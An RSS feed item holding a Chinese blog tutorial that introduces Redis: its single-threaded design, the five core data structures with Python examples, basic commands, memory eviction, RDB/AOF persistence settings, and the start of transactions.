</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全栈进阶-redis入门实战概念篇]]></title>    <link>https://juejin.cn/post/7603195960254513152</link>    <guid>https://juejin.cn/post/7603195960254513152</guid>    <pubDate>2026-02-05T12:00:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254513152" data-draft-id="7603043152673062927" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全栈进阶-redis入门实战概念篇"/> <meta itemprop="keywords" content="Python,Redis,后端"/> <meta itemprop="datePublished" content="2026-02-05T12:00:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="只与明月听"/> <meta itemprop="url" content="https://juejin.cn/user/386661153249102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全栈进阶-redis入门实战概念篇
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/386661153249102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    只与明月听
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:00:48.000Z" title="Thu Feb 05 2026 12:00:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读28分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">第一阶段：redis基础</h2>
<h4 data-id="heading-1">1. 简介</h4>
<p><code>Redis</code>是一款开源的、基于内存的键值对数据库，支持将内存持久化到磁盘，还提供了丰富的数据结构、事务、发布订阅等功能，被广泛的用于缓存、消息队列、会话存储等场景。</p>
<p>作为一个前端开发，对于<code>Redis</code>第一影响就是读写操作非常的快，常用于一些需要快速读写数据的场景，比如存储会话<code>session</code>。<code>Redis</code>之所以这么快，在于<code>Redis</code>利用了内存操作、IO多路复用、避免线程切换开销三大核心优势，让单线程也足以支撑超高并发。</p>
<p><code>Redis</code>并非纯单线程，只是在接受客户请求的核心处理流程是单线程的，在处理慢操作，比如持久化读写磁盘、异步删除大键、主从复制的网络同步，会启动多个辅助线程。为啥当初<code>Redis</code>不是设计成多线程呢，主要是单线程设计简单，核心逻辑都是串行执行的，后续的维护成本极低，同时也避免了多线程的死锁啊，数据一致性啊这些麻烦的问题；内存的操作足够快，多线程必然会涉及到线程切换和锁竞争，这些都会降低效率；IO的多路复用，<code>Redis</code>运行在网络层，使用的基于<code>Unix</code>系统的IO多路复用机制，就是主线程通过事件循环来监听所有客户端的IO操作，维护一个事件队列去处理IO操作，这种单线程非阻塞的IO多路复用让<code>Redis</code>可以同时管理上万的<code>TCP</code>连接。</p>
<h4 data-id="heading-2">2.redis数据基本结构</h4>
<p><code>Redis</code>基本数据结构主要五个，接下来挨个介绍下</p>
<p>首先安装下环境：</p>
<pre><code class="hljs">pip install redis
</code></pre>
<p>先创建一个虚拟环境，然后安装相应的依赖</p>
<pre><code class="hljs language-ini" lang="ini">import redis
​
<span class="hljs-comment"># 连接到你的线上 Redis</span>
<span class="hljs-attr">r</span> = redis.Redis.from_url(
    "redis://:xxx",
    <span class="hljs-attr">decode_responses</span>=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># 返回 str 而不是 bytes</span>
)
​
<span class="hljs-comment"># 设置一个 study:string 的 key</span>
r.set("study:string", "hello redis from python")
​
<span class="hljs-comment"># 读出来验证一下</span>
<span class="hljs-attr">value</span> = r.get(<span class="hljs-string">"study:string"</span>)
print("study:<span class="hljs-attr">string</span> =<span class="hljs-string">", value)
</span></code></pre>
<h5 data-id="heading-3">2.1 String</h5>
<p><code>String</code>是<code>Redis</code>最基础、最常用的数据结构，所有的键值对的<code>value</code>本质上都可以使用<code>String</code>来存储，单<code>key</code>最大容量512M，所有的操作都是原子性的，支持位运算和过期策略。</p>
<p>比如前面的案例<code>r.set("study:string", "hello redis from python")</code>，就是设置一个字符串</p>
<p>如果要设置一个过期时间的话，也比较简单</p>
<p><code>r.set("study:string", "hello redis from python", ex=60)</code>，这里的<code>ex</code>就是秒数，如果是<code>px</code>就是毫秒数，这里设置的时间就表明key的过期时间，如果过期了key就会被删除。</p>
<h5 data-id="heading-4">2.1 Hash</h5>
<p><code>Hash</code>是一个键对应多个键值对的结构，类似于<code>Map</code>和字典，一般用来存储结构化的对象。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">r.hset(<span class="hljs-string">"study:hash"</span>, mapping={
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"张三"</span>,
    <span class="hljs-string">"age"</span>: <span class="hljs-string">"20"</span>,
})
​
<span class="hljs-keyword">data</span> = r.hgetall(<span class="hljs-string">"study:hash"</span>)
print(<span class="hljs-keyword">data</span>)  # {<span class="hljs-string">'name'</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-string">'20'</span>}
</code></pre>
<p>如果要删除<code>hash</code>中的指定字段的话，可以使用这个方法<code>hdel</code></p>
<pre><code class="hljs language-arduino" lang="arduino">r.<span class="hljs-built_in">hdel</span>(<span class="hljs-string">"study:hash"</span>, <span class="hljs-string">"age"</span>)
</code></pre>
<h5 data-id="heading-5">2.3 List</h5>
<p>这里的<code>List</code>是按照插入顺序排序的字符串集合，支持两端搞笑增删，中间查询稍慢，是一个双向链表。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 从右侧依次塞入几个元素</span>
r.rpush(<span class="hljs-string">"study:list"</span>, <span class="hljs-string">"apple"</span>, <span class="hljs-string">"banana"</span>, <span class="hljs-string">"orange"</span>)
​
<span class="hljs-comment"># 从左侧再塞一个</span>
r.lpush(<span class="hljs-string">"study:list"</span>, <span class="hljs-string">"pear"</span>)   <span class="hljs-comment"># list 现在是: ["pear", "apple", "banana", "orange"]</span>
​
<span class="hljs-comment"># 读取整个 list（0 到 -1 表示所有元素）</span>
items = r.lrange(<span class="hljs-string">"study:list"</span>, 0, -1)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"study:list ="</span>, items)
​
<span class="hljs-comment"># 弹出一个元素（比如从左边弹）</span>
left = r.lpop(<span class="hljs-string">"study:list"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"lpop 之后取出的 ="</span>, left)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"剩下的 ="</span>, r.lrange(<span class="hljs-string">"study:list"</span>, 0, -1))
</code></pre>
<p>可以用来存储一些任务队列和消息队列</p>
<h5 data-id="heading-6">2.4 Set</h5>
<p><code>Set</code> 是无序、元素唯一的字符串集合，支持集合间的交、并、差运算，适合处理 “去重” 和 “关系匹配” 场景。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 往 set 里加元素（去重）</span>
r.sadd(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"apple"</span>, <span class="hljs-string">"banana"</span>, <span class="hljs-string">"orange"</span>)
r.sadd(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"banana"</span>)  <span class="hljs-comment"># 再加一次不会重复</span>
​
<span class="hljs-comment"># 查看所有成员</span>
members = r.smembers(<span class="hljs-string">"study:set"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"study:set ="</span>, members)
​
<span class="hljs-comment"># 判断某个值是否在 set 中</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"是否包含 apple:"</span>, r.sismember(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"apple"</span>))
​
<span class="hljs-comment"># 删除一个成员</span>
r.srem(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"banana"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"删除 banana 后 ="</span>, r.smembers(<span class="hljs-string">"study:set"</span>))
​
<span class="hljs-comment"># 给整个 set 设置过期时间 60 秒</span>
r.expire(<span class="hljs-string">"study:set"</span>, 60)
</code></pre>
<h5 data-id="heading-7">2.5 ZSet</h5>
<p><code>ZSet</code> 是 Set 的升级版，每个元素关联一个 “分数（score）”，Redis 会按分数从小到大排序，兼具 唯一性 和 有序性。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 往 zset 里加数据：成员 + 分数</span>
r.zadd(<span class="hljs-string">"study:zset"</span>, {
    <span class="hljs-string">"Alice"</span>: <span class="hljs-number">100</span>,
    <span class="hljs-string">"Bob"</span>: <span class="hljs-number">80</span>,
    <span class="hljs-string">"Charlie"</span>: <span class="hljs-number">95</span>,
})
​
<span class="hljs-comment"># 按分数从小到大取出所有成员</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"从小到大："</span>, r.zrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
​
<span class="hljs-comment"># 按分数从大到小取出前 2 名</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"从大到小前2名："</span>, r.zrevrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
​
<span class="hljs-comment"># 给某个人加分（比如 Alice +10）</span>
r.zincrby(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">10</span>, <span class="hljs-string">"Alice"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Alice 加分后："</span>, r.zrevrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
​
<span class="hljs-comment"># 删除一个成员</span>
r.zrem(<span class="hljs-string">"study:zset"</span>, <span class="hljs-string">"Bob"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"删除 Bob 后："</span>, r.zrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
</code></pre>
<p>有一个常见的面试题，<code>Hash</code>和<code>String</code>都可以用来存储对象，一般用那个来存储对象呢，使用<code>String</code>来存储对象，简单直观，但是它不支持局部更新，改一个字段需要覆盖这个字符串，适合一些整体读写、字段少的场景；<code>Hash</code>存储对象，他就支持局部更新，适合一些复杂对象的存储，比如高频更新字段。</p>
<h4 data-id="heading-8">3. redis基本命令</h4>
<p>因为<code>Redis</code>都是键值对的存储，所以他的方法也很简单，看下面这个例子：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 1. SET：设置一个字符串 key</span>
r.<span class="hljs-keyword">set</span>(<span class="hljs-string">"study:string"</span>, <span class="hljs-string">"hello"</span>)
​
<span class="hljs-meta"># 2. GET：读取这个 key</span>
print(<span class="hljs-string">"GET study:string ="</span>, r.<span class="hljs-keyword">get</span>(<span class="hljs-string">"study:string"</span>))  <span class="hljs-meta"># hello</span>
​
<span class="hljs-meta"># 3. INCR：自增一个数值型 key</span>
<span class="hljs-meta"># 如果这个 key 不存在，会从 0 开始加 1，变成 "1"</span>
r.delete(<span class="hljs-string">"study:count"</span>)  <span class="hljs-meta"># 为了方便测试，先删掉</span>
r.incr(<span class="hljs-string">"study:count"</span>)    <span class="hljs-meta"># 当前值 1</span>
r.incr(<span class="hljs-string">"study:count"</span>)    <span class="hljs-meta"># 当前值 2</span>
r.incr(<span class="hljs-string">"study:count"</span>, <span class="hljs-number">5</span>) <span class="hljs-meta"># 加 5 -&gt; 当前值 7</span>
print(<span class="hljs-string">"study:count ="</span>, r.<span class="hljs-keyword">get</span>(<span class="hljs-string">"study:count"</span>))  <span class="hljs-meta"># 7</span>
​
<span class="hljs-meta"># 4. EXPIRE：给 key 设置过期时间（单位：秒）</span>
r.expire(<span class="hljs-string">"study:count"</span>, <span class="hljs-number">5</span>)  <span class="hljs-meta"># 5 秒后过期</span>
</code></pre>
<p>读、写、自增和设置过期时间，都比较简单。</p>
<p>因为<code>Redis</code>都是键值对，没有表的概念，所以<code>Key</code>管理就成了问题，社区有一个约定的规范：<code>业务标识:模块名称:唯一标识[:子字段]</code>，比如<code>ecom:user:1001:name</code>，这就是电商业务：用户模块：用户id：用户名。还有一些额外的补充规范：</p>
<ol start="0">
<li>统一小写：避免大小写混乱，<code>User:1</code>和<code>user:1</code>是两个key</li>
<li>简洁且语义化：看到名称基本就能了解存储的内容</li>
<li>避免特殊字符：比如空格、换行符、下划线</li>
</ol>
<h2 data-id="heading-9">第二阶段：redis核心机制</h2>
<h4 data-id="heading-10">4.redis内存模型</h4>
<p><code>Redis</code>是一个内存数据库，大多数数据都保存才内存中。它的内存可以分为两大部分，核心内存和辅助内存。其中核心内存存储的就是我们常用的键值对，也就是<code>key</code>内存和<code>value</code>内存，存储的都是我们所用到的数据；辅助内存放的都是非业务数据，就是<code>Redis</code>运行所需的额外内存，比如一些过期字典、进程本身的开销等。</p>
<p><code>Redis</code>有一套完善的内存管理机制，主要有这么几步</p>
<ol start="0">
<li>基于<code>jemalloc</code>内存分配，将内存划分为不同大小的内存页，比如8B，16B，32B等，分配时匹配最接近的页，减少碎片；线程缓存，减少锁竞争，提升分配效率</li>
<li>内存回收：内存回收主要有两种，惰性删除和定期删除。惰性删除指的是访问key时检查是否过期，过期了就删除；定期删除，每100ms随机抽查过期的key，去删除已经过期的，但是这里有个问题，如果key过期了，但是没有被抽查到呢，为啥不扫描全量的key呢，这就是一个平衡了，全量扫描需要占用大量的CPU，会影响到业务的，这个就叫做延迟回收，也就是说可能一时半会回收不了，但是终归会被回收。</li>
</ol>
<p><code>Redis</code>的内存处理机制天然就有一种滞后性，可能就会出现内存满了的情况，这里的内存满了，并不是设置某个key的value大小超过512M，而是<code>Redis</code>进程占用的内存满了，这里的满有两个意思：主动设置的<code>maxmemory</code>，这个在生产环境上是必须要设置的</p>
<pre><code class="hljs language-bash" lang="bash">maxmemory 4GB  <span class="hljs-comment"># 限制 Redis 最大使用内存为 4GB</span>
</code></pre>
<p>还有一种满就是，如果不设置这个最大值，<code>Redis</code>就会无限制的占用服务器的物理内存，直到耗尽服务器所有可用的物理内存，这个时候操作系统会将<code>Redis</code>的内存数据交换到磁盘的swap分区，这个是磁盘模拟的内存，速度巨慢，最终导致<code>Redis</code>性能暴跌，也可能因为服务器内存耗尽而被系统杀死。</p>
<p>当内存满了后，<code>Redis</code>也有一套内存淘汰策略来处理这种情况，当<code>Redis</code>占用的内存超过设置的<code>maxmemory</code>后，然后再去执行写操作，就会去触发我们的内存淘汰策略，主要有这么几种策略：</p>
<ol start="0">
<li>
<p>LRU</p>
<p>最近最少使用，就是淘汰那些最近访问次数最少的key，标准的LRU需要维护一个访问时间链表，内存和cpu开销大，<code>Redis</code>实现的是近似LRU：维护一个候选池，触发淘汰时，从目标范围随机抽取key，也就是触发淘汰时，随机抽取一批key，然后比一比谁的访问时间最远，然后就淘汰它。</p>
</li>
<li>
<p>LFU</p>
<p>优先淘汰访问频率最低的key，<code>Redis</code>实现的LFU并不是简单的访问次数统计，而是通过概率递增的访问计数+时间衰减机制来近似的反应key的长期访问价值；在触发淘汰时，在通过随机采样的方式选择访问评率最低的key去淘汰。</p>
</li>
</ol>
<p>当内存满了后，再去对数据库做读写操作，读的操作没有影响，但是在触发写的操作时，如果内存满了，会先根据<code>maxmemory-policy</code>设置的内存淘汰策略，在写操作触发的同时根据LFU、LRU去更新内存，直到内存会到安全区；如果内存淘汰策略味为<code>noeviction</code>或者无法淘汰，直接回报错。</p>
<h4 data-id="heading-11">5.持久化机制</h4>
<p>前面也提到了，<code>Redis</code>是一种基于内存的键值数据库，内存的特性就是在服务器重启后会全部丢失，这就需要将数据做持久化，即使服务器重启了，也可以从磁盘中恢复数据至内存。</p>
<p><code>Redis</code>提供了两种核心的持久化方式：RDB和AOF，快照持久化和追加文件持久化，接下来挨个介绍下：</p>
<h6 data-id="heading-12">快照持久化</h6>
<p>RDB是定时对<code>Redis</code>内存中的全量数据做一次拍照，生成一个压缩的二进制文件，比如<code>dump.rdb</code>，保存到磁盘的指定目录。<code>Redis</code>重启时直接加载这个二进制文件，将数据恢复到内存中。</p>
<p>RDB有手动触发和自动触发两种方式：手动触发可以使用<code>save</code>来同步触发，同步触发会阻塞主进程，直到RDB文件生成完成，异步触发通过<code>bgsave</code>来触发，<code>Redis</code>会fork一个子进程来执行RDB文件的生成，主进程会继续处理客户端的请求；自动触发是在配置文件<code>redis.conf</code>中通过快照规则来配置的，满足条件就会自动执行<code>bgsave</code></p>
<pre><code class="hljs language-bash" lang="bash">save 900 1      <span class="hljs-comment"># 900 秒内至少 1 次写</span>
save 300 10     <span class="hljs-comment"># 300 秒内至少 10 次写</span>
save 60 10000   <span class="hljs-comment"># 60 秒内至少 10000 次写</span>
</code></pre>
<p>这里就是自动触发RDB的规则：满足其中的任意条件就会触发一次，比如60s内写一次、300s内写10次等。</p>
<p>RDB优点就在于性能开销小，生成RDB由子进程负责，主进程仅做fork操作，几乎不影响业务；二进制文件直接加载到内存速度也很快。但是缺点也很明显，RDB是定时快照，如果<code>Redis</code>意外崩溃，比如服务器断电，就会丢掉最后一次快照前到崩溃前的所有数据。</p>
<h6 data-id="heading-13">追加日志持久化</h6>
<p>AOF就是为了解决RDB数据库丢失而设计的持久化方式，就是将<code>Redis</code>的操作日志按照顺序记录下来，重启后通过重放AOF文件中所有的写命令去恢复内存数据。默认是关闭的，需要<code>appendonly yes</code>命令来手动重启。</p>
<p>AOF的相关配置在<code>redis.conf</code>文件中</p>
<pre><code class="hljs language-bash" lang="bash">appendonly <span class="hljs-built_in">yes</span> <span class="hljs-comment"># 开启AOF（默认no，关闭）</span>
appendfilename <span class="hljs-string">"appendonly.aof"</span> <span class="hljs-comment"># AOF文件名，默认保存在Redis工作目录</span>
<span class="hljs-built_in">dir</span> ./ <span class="hljs-comment"># 持久化文件（RDB/AOF）的保存目录，默认是Redis启动目录</span>
</code></pre>
<p>AOF主要分为三个步骤：</p>
<ol start="0">
<li>
<p>命令追加</p>
<p><code>Redis</code>执行完一个写命令后，会将该命令按照协议追加到内存中的AOF缓冲区，避免直接写入磁盘，减少IO开销</p>
</li>
<li>
<p>文件写入</p>
<p><code>Redis</code>会定期将AOF缓冲区的数据写入到内核页缓存，这个操作是调用操作系统的write方法，属于异步操作，不会阻塞主线程。</p>
</li>
<li>
<p>文件同步</p>
<p>将内核页缓存中的AOF数据写到测盘中，这个是调用的操作系统的同步方法，会阻塞主线程的，直到刷盘完成。</p>
<p>将AOF缓冲区中的命令刷到磁盘的AOF文件中，有三种策略：</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># appendfsync 有三个取值：</span>
appendfsync always  <span class="hljs-comment"># 每次写命令都立即刷盘（同步），数据最安全，性能最差</span>
appendfsync everysec<span class="hljs-comment"># 每秒刷盘一次（默认值），平衡数据安全和性能</span>
appendfsync <span class="hljs-keyword">no</span>      <span class="hljs-comment"># 由操作系统决定何时刷盘，性能最好，数据丢失风险最高</span>
</code></pre>
</li>
</ol>
<p>由于AOF是日志追加的形式，会产生大量的中间态，比如<code>set key 1</code> → <code>set key 2</code> → <code>set key 3</code> ，这种中间态其实是没有意义的，还会导致AOF文件变得很大，这就需要AOF重写机制了，重写就是遍历内存中的所有的数据，根据当前的键值对生成一套最简的写命令集来替换原有的AOF文件，重写的触发也分为手动触发和自动触发：手动触发需要执行<code>bgrewriteaof</code>命令；自动触发是通过配置文件，当文件的体积增长到达阙值时，自动触发<code>`bgrewriteaof</code>：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">auto</span>-aof-rewrite-min-size <span class="hljs-number">64</span>mb  # AOF文件的最小体积，低于这个值不触发重写（默认<span class="hljs-number">64</span>mb）
<span class="hljs-keyword">auto</span>-aof-rewrite-percentage <span class="hljs-number">100</span> # 重写触发的百分比，指当前AOF文件体积比上一次重写后的体积增长了多少（默认<span class="hljs-number">100</span>%）
</code></pre>
<p>AOF的优点就是，可以通过刷盘策略来控制数据丢失的风险，默认的<code>everysec</code>仅丢失1s的数据，<code>alway</code>几乎无丢失；缺点就是AOF文件体积较大，恢复数据时加载较慢。</p>
<h6 data-id="heading-14">混合持久化</h6>
<p>RDB和AOF单独使用都各有优缺点，在<code>Redis 4.0</code>之后，引入了混合持久化机制，融合恶RDB和AOF的优点，成为了目前生产环境的首选方案。</p>
<p>在<code>redis.conf</code>配置文件中开启混合持久化：</p>
<pre><code class="hljs language-bash" lang="bash">aof-use-rdb-preamble <span class="hljs-built_in">yes</span>  <span class="hljs-comment"># 开启混合持久化（Redis 4.0+，默认no；Redis 6.0+ 部分版本默认yes）</span>
</code></pre>
<p>开启后，AOF文件就不再是纯文本了，头部就成了RDB格式的全量数据快照，也就是二进制文件，尾部是AOF格式写的增量命令，记录从生成RDB快照到当前的所有写命令，是纯文本。</p>
<p>其工作流程主要有这么几个步骤：</p>
<p>当AOF触发重写时，</p>
<ol start="0">
<li>redis主进程进入fork子进程，执行AOF重写</li>
<li>子进程首先将内存中的全量数据以RDB格式写入到临时的AOF文件头部</li>
<li>子进程完成RDB写入后，主进程将AOF重写缓冲区中所有的增量写命令，以AOF格式写入到临时的AOF文件尾部</li>
<li>主进程用临时AOF文件替换掉旧的AOF文件，完成混合持久化的重写。</li>
</ol>
<p>混合持久化的优点就在于加载速度快，数据丢失风险小，而且文件的体积也不会很大。</p>
<p>下面推荐一个常见的生产环境的配置，开启混合持久化+RBD默认自动快照：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ===================== RDB 核心配置 =====================</span>
save 900 1
save 300 10
save 60 10000
rdbcompression <span class="hljs-built_in">yes</span>  <span class="hljs-comment"># 开启RDB压缩</span>
dbfilename dump.rdb <span class="hljs-comment"># RDB文件名</span>
<span class="hljs-built_in">dir</span> ./              <span class="hljs-comment"># 持久化文件存储目录（建议修改为独立的磁盘目录）</span>
​
<span class="hljs-comment"># ===================== AOF 核心配置 =====================</span>
appendonly <span class="hljs-built_in">yes</span>      <span class="hljs-comment"># 开启AOF（混合持久化的前提）</span>
appendfilename <span class="hljs-string">"appendonly.aof"</span> <span class="hljs-comment"># AOF文件名</span>
appendfsync everysec <span class="hljs-comment"># 刷盘策略，生产首选</span>
auto-aof-rewrite-min-size 64mb <span class="hljs-comment"># AOF重写最小体积</span>
auto-aof-rewrite-percentage 100 <span class="hljs-comment"># AOF重写增长百分比</span>
aof-use-rdb-preamble <span class="hljs-built_in">yes</span> <span class="hljs-comment"># 开启混合持久化（Redis 4.0+）</span>
aof-load-truncated <span class="hljs-built_in">yes</span> <span class="hljs-comment"># 加载AOF时，若尾部损坏则忽略，继续加载（默认yes）</span>
</code></pre>
<h4 data-id="heading-15">6. redis事务</h4>
<p><code>Redis</code>事务就是提供一种机制，将多个<code>Redis</code>命令打包成一个执行单元，保证这个单元内的命令会按照顺序、无中断的执行，同时支持对命令执行结果的统一处理，解决多命令批量执行的原子性需求。</p>
<p><code>Redis</code>事务只依赖五个命令：</p>
<ol start="0">
<li>MULTI 标记事务开始，后续所有的命令都会加入到事务队列中</li>
<li>EXEC 执行事务队列中的所有命令，执行完成后结束事务，返回所有命令的执行结果</li>
<li>DISCARD 放弃事务队列中的所有命令，清空队列结束事务，回到正常的执行模式</li>
<li>WATCH KEY 对key加乐观锁，监控key是否修改，必须在<code>MULTI</code>之前修改</li>
<li>UNWATCH 取消所有被watch监控的key，事务取消或者执行后会自动执行</li>
</ol>
<p>看下这个最基础的实务流程：</p>
<pre><code class="hljs language-sql" lang="sql">MULTI
<span class="hljs-keyword">SET</span> balance <span class="hljs-number">100</span>
INCR balance
<span class="hljs-keyword">EXEC</span>
</code></pre>
<p>执行到<code>MULTI</code>时，会进入事务状态，后续的<code>SET</code>、<code>INCR</code>会被放入到一个事务队列中，直行到<code>EXEC</code>时才会执行队列中的所有的命令。</p>
